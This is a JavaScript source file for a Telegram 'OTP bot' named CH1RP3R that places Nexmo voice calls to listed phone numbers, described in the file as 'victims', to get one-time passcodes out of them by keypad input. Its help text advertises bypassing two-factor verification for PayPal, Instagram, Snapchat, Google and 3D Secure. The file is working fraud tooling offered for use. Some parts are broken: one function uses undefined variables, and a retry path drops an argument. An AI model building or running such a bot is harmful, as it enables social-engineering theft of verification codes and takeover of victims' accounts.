const NexmoHelperError = require('./NexmoHelperError');
const TelegramHelper = require('./TelegramHelper');
const uuidV1 = require('uuid/v1');

const HELP_MSG = `
<b>Bypass SMS verifications from:</b>

1.Paypal 
2.Instagram 
3.Snapchat
4.Google 
5.3D Secure, and many others... using <b>CH1RP3R</b> OTP Bot or the private API.

<b>Help, Commands & Informations</b>

- /call ☎️ [phone_number1] [phone_number2]:- Initiates an otp call.
- /help 📲 :- displays this help message.

I presently only support otp calling for 2fa authentication bypass. You can create a otp call by using the /call command and listing the phone numbers of the victims you'd like to get otp from. 
For example,

- /call otp 14155550123 14155550456 would call both of those numbers for otp and acquire the otp code from there dtmf input.

I'll support more functionality in the future. Checkout my project on https://chirperotp.com and take a look at the issues to see what's planned. Please do get involved.`;

class NexmoHelper {
  constructor(bot, nexmo, config) {
    this.supportedIntents = {
      'otp': this._conferenceIntent,
      'conf': this._conferenceIntent,
      'help': this._helpIntent,
    };

    this.bot = bot;
    this.nexmo = nexmo;
    this.config = config;

    this.telegramHelper = new TelegramHelper();
  }

  handleMessage(message) {
    if (!message.tokens || message.tokens.length === 0) {
      throw new NexmoHelperError(`Message does not contain any valid command.`);
    }

    const intentToken = message.tokens[0];
    const intent = this.supportedIntents[intentToken];


    if (!intent) {
      this.bot.api.sendMessage(message.chat.id, `<b>[WARNING!]⚠️:</b> Sorry, unsupported command: ${intentToken}. ${HELP_MSG}`, {
        parse_mode: 'HTML',
      });
    } else {
      intent.call(this, message);
    }
  }

  _conferenceIntent(message) {
    if (message.tokens.length < 2) {
      throw new NexmoHelperError(`"call" command requires tokens for call participants. For example, phone numbers.`);
    }

    const usersToDialIn = {};
    
    message.tokens.forEach((token) => {
      if (/^\d+$/.test(token)) {
        usersToDialIn[token] = { phoneNumber: token };
      } else {
        console.log(`Ignoring token "${token}"`);
      }
    });

    let telegramResponse = `The following victims will be called for otp ${Object.keys(usersToDialIn).join(', ')}`;
    this.bot.api.sendMessage(message.chat.id, telegramResponse, {
      parse_mode: 'HTML',
    });

    this._callUsers(usersToDialIn, (callResults) => {
      console.log(callResults);
    }, message);
  }


  _helpIntent(message) {
    this.bot.api.sendMessage(message.chat.id, HELP_MSG, {
      parse_mode: 'HTML',
    });
  }


  _callUsers(users, callback, message) {
    const callResults = [];
    const conferenceId = `telegram_conf_${uuidV1()}`;

    Object.keys(users).forEach((userId) => {
      this._makeCall(conferenceId, userId, (result) => {
        callResults.push(result);
      }, message)
    });

    callback(callResults);
  }

  _makeCall(conferenceId, phoneNumber, callback, message) {
    this.bot.api.sendMessage(message.chat.id, '<b>Calling...</b>  ☎️ ' + phoneNumber, {
      parse_mode: 'HTML',
    });
    const answerUrl = `${this.config.BASE_URL}/webhooks/answer?conference_id=${conferenceId}`;
    let callResult = { success: null, error: null };

    this.nexmo.calls.create({
     to: [{
       type: 'phone',
       number: phoneNumber
     }],
     from: {
       type: 'phone',
       number: this.config.TELEGRAM_BOT_PHONE_NUMBERS[0] // use first configured number
     },
     answer_url: [answerUrl]
   }, (error, result) => {
     if(error) {
       callResult.error = error;
       // console.error(error);
       if(error.statusCode === 429) {
         const backOffMillis = error.headers['retry-after'];
         console.log(`429 response returned. retrying after ${backOffMillis} seconds`);
         
         setTimeout(() => {
           this._makeCall(conferenceId, phoneNumber, callback);
         }, backOffMillis);
       }
     }
     else {
       callResult.success = result;
      }
    });
  }

  _handleRingingEvent(conferenceId, phoneNumber, message) {
    // Implement Nexmo Call Event Webhook to handle ringing event
    this.bot.api.sendMessage(message.chat.id, 'Ringing...  ☎️ ' + phoneNumber, {
      parse_mode: 'HTML',
    })
    // Example: Assume you have a webhook endpoint for call events
    const webhookUrl = `${this.config.BASE_URL}/webhooks/event?conference_id=${conferenceId}`;
    // Set up Nexmo event listener
    this.nexmo.calls.update(conferenceId, { 
      event_url: [webhookUrl] 
    }, (error, result) => {
      if (error) {
        console.error(`Error setting up event webhook: ${error.message}`);
      } else {
        console.log(`Event webhook set up successfully for call ${conferenceId}`);
        console.log(result);
     }
     callback(callResult);
   });
  }
}

module.exports = NexmoHelper;